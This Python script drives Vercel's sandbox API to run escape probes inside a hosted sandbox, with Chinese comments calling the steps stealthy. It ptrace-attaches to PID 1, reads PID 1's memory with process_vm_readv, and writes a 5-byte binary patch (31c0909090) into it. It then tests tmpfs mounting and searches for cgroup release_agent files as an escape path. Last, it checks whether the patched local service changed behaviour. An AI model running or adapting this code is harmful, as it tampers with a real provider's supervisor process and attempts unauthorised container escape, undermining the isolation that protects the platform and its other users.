# 实验J238: 对照实验定位"被杀"触发点 + process_vm_readv隐蔽读 + mount/cgroup单独测
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj238"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# A) 基线: 什么都不做, 确认沙箱存活 + 记录 TracerPid
CODE_A = r'''
import os, time
print("PID", os.getpid(), flush=True)
print("TRACER_BEFORE", open("/proc/self/status").read().split("TracerPid:")[1].split("\n")[0].strip(), flush=True)
time.sleep(5)
print("ALIVE_A", flush=True)
'''
run_cmd(sid, CODE_A, "A_BASELINE", timeout=100)

# B) 最小接触: PTRACE_ATTACH 后立即 DETACH (无sleep无PEEK)
CODE_B = r'''
import ctypes, time, os
libc = ctypes.CDLL("libc.so.6", use_errno=True)
def p(*a): print(" ".join(str(x) for x in a), flush=True)
p("TRACER_B", open("/proc/self/status").read().split("TracerPid:")[1].split("\n")[0].strip())
r1 = libc.ptrace(16, 1, 0, 0)  # PTRACE_ATTACH
p("ATTACH", r1, "errno", ctypes.get_errno())
r2 = libc.ptrace(17, 1, 0, 0)  # PTRACE_DETACH 立即
p("DETACH", r2, "errno", ctypes.get_errno())
p("DONE_B", flush=True)
'''
run_cmd(sid, CODE_B, "B_ATTACH_DETACH", timeout=100)

# C) process_vm_readv 读 PID1 内存 (不attach, 隐蔽)
CODE_C = r'''
import ctypes, os
class Iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.process_vm_readv.argtypes = [ctypes.c_int, ctypes.POINTER(Iovec), ctypes.c_ulong, ctypes.POINTER(Iovec), ctypes.c_ulong, ctypes.c_ulong]
libc.process_vm_readv.restype = ctypes.c_ssize_t
buf = ctypes.create_string_buffer(16)
local = Iovec(ctypes.cast(buf, ctypes.c_void_p), 16)
remote = Iovec(0x400000, 16)
n = libc.process_vm_readv(1, ctypes.byref(local), 1, ctypes.byref(remote), 1, 0)
print("PVR", "n", n, "errno", ctypes.get_errno(), "hex", buf.raw.hex(), flush=True)
# 再读 TracerPid 确认自己没变
print("TRACER_C", open("/proc/self/status").read().split("TracerPid:")[1].split("\n")[0].strip(), flush=True)
print("DONE_C", flush=True)
'''
run_cmd(sid, CODE_C, "C_PVR_READ", timeout=100)

# D) process_vm_writev 写 PID1 内存 (验证隐蔽写 = patch 替代品)
CODE_D = r'''
import ctypes, os
class Iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.process_vm_readv.argtypes = [ctypes.c_int, ctypes.POINTER(Iovec), ctypes.c_ulong, ctypes.POINTER(Iovec), ctypes.c_ulong, ctypes.c_ulong]
libc.process_vm_readv.restype = ctypes.c_ssize_t
libc.process_vm_writev.argtypes = [ctypes.c_int, ctypes.POINTER(Iovec), ctypes.c_ulong, ctypes.POINTER(Iovec), ctypes.c_ulong, ctypes.c_ulong]
libc.process_vm_writev.restype = ctypes.c_ssize_t
# 先读旧的
buf = ctypes.create_string_buffer(5)
local = Iovec(ctypes.cast(buf, ctypes.c_void_p), 5)
remote = Iovec(0x83afe0, 5)
n = libc.process_vm_readv(1, ctypes.byref(local), 1, ctypes.byref(remote), 1, 0)
print("OLD", n, buf.raw.hex(), flush=True)
# 写 5 字节 (与已知 patch 相同: 31c0909090)
data = bytes.fromhex("31c0909090")
wbuf = ctypes.create_string_buffer(data, 5)
wlocal = Iovec(ctypes.cast(wbuf, ctypes.c_void_p), 5)
n2 = libc.process_vm_writev(1, ctypes.byref(wlocal), 1, ctypes.byref(remote), 1, 0)
print("WRITE", n2, "errno", ctypes.get_errno(), flush=True)
# 读回验证
buf2 = ctypes.create_string_buffer(5)
local2 = Iovec(ctypes.cast(buf2, ctypes.c_void_p), 5)
n3 = libc.process_vm_readv(1, ctypes.byref(local2), 1, ctypes.byref(remote), 1, 0)
print("NEW", n3, buf2.raw.hex(), flush=True)
print("DONE_D", flush=True)
'''
run_cmd(sid, CODE_D, "D_PVW_WRITE", timeout=100)

# E) mount 单独测 (这次不会被attach打断)
CODE_E = r'''
import subprocess
def p(*a): print(" ".join(str(x) for x in a), flush=True)
r = subprocess.run("mkdir -p /tmp/xx && mount -t tmpfs tmpfs /tmp/xx && echo MOUNT_OK && touch /tmp/xx/f && ls /tmp/xx/f && umount /tmp/xx && echo UMOUNT_OK", shell=True, capture_output=True, text=True, timeout=10)
p("MOUNT", "rc", r.returncode, (r.stdout + r.stderr)[:300].replace(chr(10), "|"))
# mountinfo 看挂载类型
r = subprocess.run("grep -E 'tmpfs|overlay|ext4|xfs' /proc/self/mountinfo | head -10", shell=True, capture_output=True, text=True, timeout=10)
p("MOUNTINFO", (r.stdout + r.stderr)[:600].replace(chr(10), "|"))
print("DONE_E", flush=True)
'''
run_cmd(sid, CODE_E, "E_MOUNT", timeout=100)

# F) cgroup 探测 (release_agent 逃逸路径)
CODE_F = r'''
import subprocess, os
def p(*a): print(" ".join(str(x) for x in a), flush=True)
r = subprocess.run("cat /proc/self/cgroup; ls -la /sys/fs/cgroup/ | head -20", shell=True, capture_output=True, text=True, timeout=10)
p("CGROUP", (r.stdout + r.stderr)[:700].replace(chr(10), "|"))
# 找 release_agent 和可写子系统
r = subprocess.run("find /sys/fs/cgroup -name 'release_agent' -o -name 'notify_on_release' 2>/dev/null | head -10; ls -la /sys/fs/cgroup/*/release_agent 2>&1 | head -5", shell=True, capture_output=True, text=True, timeout=10)
p("RA", (r.stdout + r.stderr)[:500].replace(chr(10), "|"))
# 检查当前 cgroup 是否可写
r = subprocess.run("cg=$(cat /proc/self/cgroup | cut -d: -f3); echo CGPATH=$cg; ls -la /sys/fs/cgroup$cg 2>&1 | head -10", shell=True, capture_output=True, text=True, timeout=10)
p("CGDIR", (r.stdout + r.stderr)[:500].replace(chr(10), "|"))
print("DONE_F", flush=True)
'''
run_cmd(sid, CODE_F, "F_CGROUP", timeout=100)

# G) 验证: 检查 30001 是否因 D 的隐蔽写而改变行为 (patch生效对照)
CODE_G = r'''
import urllib.request, urllib.error
try:
    req = urllib.request.Request("http://127.0.0.1:30001/x", data=b"{}", method="POST")
    req.add_header("Content-Type", "application/json")
    r = urllib.request.urlopen(req, timeout=4)
    print("G1", r.status, r.read()[:100], flush=True)
except urllib.error.HTTPError as e:
    print("G1", e.code, flush=True)
except Exception as e:
    print("G1 EXC", type(e).__name__, str(e)[:80], flush=True)
print("DONE_G", flush=True)
'''
run_cmd(sid, CODE_G, "G_VERIFY", timeout=100)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
